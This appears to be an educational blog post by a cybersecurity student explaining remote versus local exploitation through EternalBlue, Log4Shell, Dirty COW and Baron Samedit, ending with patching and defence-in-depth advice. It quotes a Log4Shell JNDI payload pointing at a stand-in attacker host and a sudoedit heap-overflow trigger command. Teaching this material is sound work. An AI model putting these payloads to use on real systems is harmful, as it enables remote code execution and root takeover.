---
title: Unpacking Exploits - Remote vs. Local Vulnerabilities
date: 2025-05-04
author: Bunleap Sorn
description: Diving into the mechanics of notorious remote and local exploitation examples like EternalBlue, Log4Shell, Dirty COW, and Baron Samedit, as learned in class.
tags: ["Ethical Hacking", "Cybersecurity", "Classroom Learning", "Exploitation", "Remote Exploitation", "Local Exploitation", "EternalBlue", "Log4Shell", "DirtyCOW", "BaronSamedit", "CVE", "Vulnerability"]
---

Hello, cybersecurity learners! As we progress through the intricacies of ethical hacking, a fundamental distinction we've been exploring is between **remote exploitation** and **local exploitation**. While both aim to gain unauthorized access or control, they differ significantly in *how* an attacker initiates the attack and the initial access they require. Understanding these differences is crucial for both offense and defense.

Let's break down some prominent examples we've studied in class.

### Remote Exploitation: Attacking from Afar

Remote exploitation occurs when an attacker can compromise a system over a network without having any prior access or authenticated session on the target. The attacker sends specially crafted data across the network to trigger a vulnerability, often leading to remote code execution (RCE).

#### 1. EternalBlue (CVE-2017-0144)

* **Description:** This is a critical vulnerability in Microsoft's Server Message Block (SMBv1) protocol that allows remote code execution via specially crafted packets. It was famously exploited by the WannaCry ransomware and NotPetya attacks.
* **Exploitation Scenario:**
    * **Step 1:** The attacker sends malicious SMB packets to a vulnerable Windows system (e.g., Windows 7, Server 2008) over the network. This typically occurs over Port 445.
    * **Step 2:** The exploit abuses a buffer overflow in SMBv1 to execute arbitrary code, enabling lateral movement or ransomware deployment.
* **Impact:** Full system compromise without authentication. The attacker gains SYSTEM-level control. Example: WannaCry spread globally in 2017.

![EternalBlue](https://i.imgur.com/1mHahgd.png)

#### 2. Log4Shell (CVE-2021-44228)

* **Description:** A zero-day vulnerability in Apache Log4j 2.x that allows remote code execution via JNDI lookups in logged user-controlled inputs (e.g., HTTP headers, URLs).
* **Exploitation Scenario:**
    * **Step 1:** An attacker injects a crafted payload (like `${jndi:ldap://attacker.com/malicious-java-code}`) into a vulnerable application's log field (e.g., User-Agent header, HTTP headers, forms, or user inputs).
    * **Step 2:** The vulnerable server's Log4j library processes this input, which initiates an LDAP request back to the attacker-controlled server. The server then downloads a malicious Java class, and executes it, leading to remote code execution (RCE).
* ]**Impact:** Full server compromise. Example: Mass scanning for unpatched systems led to cryptojacking and botnet infections.

![Log4Shell](https://i.imgur.com/bMFPP9w.png)

### Local Exploitation: Privilege Escalation on a Compromised System

Local exploitation occurs when an attacker already has some level of access to a system (e.g., a low-privilege user account) and then exploits a vulnerability to gain higher privileges (e.g., root or administrator). It's typically the second stage of an attack, following an initial remote compromise or direct user access.

#### 1. Dirty COW (CVE-2016-5195)

* **Description:** A Linux kernel race condition in the copy-on-write (COW) mechanism, allowing local users to escalate privileges by writing to read-only memory mappings.
    * **Copy-on-Write (COW):** Linux uses COW as a memory-saving trick. If a file is shared between processes, it's marked as "read-only." When a process tries to modify it, Linux creates a private copy.
* **Exploitation Scenario:**
    * **Step 1:** The attacker first gains low-privilege access (e.g., via phishing or a compromised application).
    * **Step 2:** The attacker runs an exploit (e.g., `dirtyc0w.c`) that triggers a race condition between `madvise()` and `write()` syscalls. This confusion in the COW mechanism allows the attacker to overwrite normally read-only files (like `/etc/passwd` or SUID binaries) without making a copy].
* **Impact:** Root access. Example: Exploited in the wild to modify system binaries, allowing the attacker to add a new root user or escalate to root privileges.

![DirtyCOW](https://i.imgur.com/kQk37BN.png)

#### 2. Baron Samedit (CVE-2021-3156)

* **Description:** A heap-based buffer overflow in `sudo` (versions 1.8.2-1.9.5p1) that allows local privilege escalation via malformed command-line arguments.
* **Exploitation Scenario:**
    * **Step 1:** An attacker with shell access runs a specially crafted command (e.g., `sudoedit -s '\' $(perl -e 'print "A"x65536')`).
    * **Step 2:** The overflow corrupts heap memory, enabling control of execution flow to gain root privileges.
* **Impact:** Root access. Example: Qualys demonstrated exploits on Ubuntu, Debian, and Fedora.

![BaronSamedit](https://i.imgur.com/Mq9Vyw7.png)

### Key Takeaways

Understanding these different types of exploits is foundational in cybersecurity. Remote exploits are often the initial breach, while local exploits are crucial for privilege escalation once inside.

* **Patching is Non-Negotiable:** As seen with EternalBlue and Log4Shell, timely patching can prevent widespread remote compromises.
* **Defense in Depth:** Even if an attacker gains initial low-level access, robust local security measures and patching of privilege escalation vulnerabilities (like Dirty COW and Baron Samedit) can prevent full system control.
* **Secure Coding and Configuration:** These vulnerabilities highlight the importance of secure coding practices (e.g., avoiding buffer overflows) and proper configuration of services and permissions.

Each of these examples represents a significant lesson in the ongoing battle between attackers and defenders, constantly pushing us to learn, adapt, and build more resilient systems.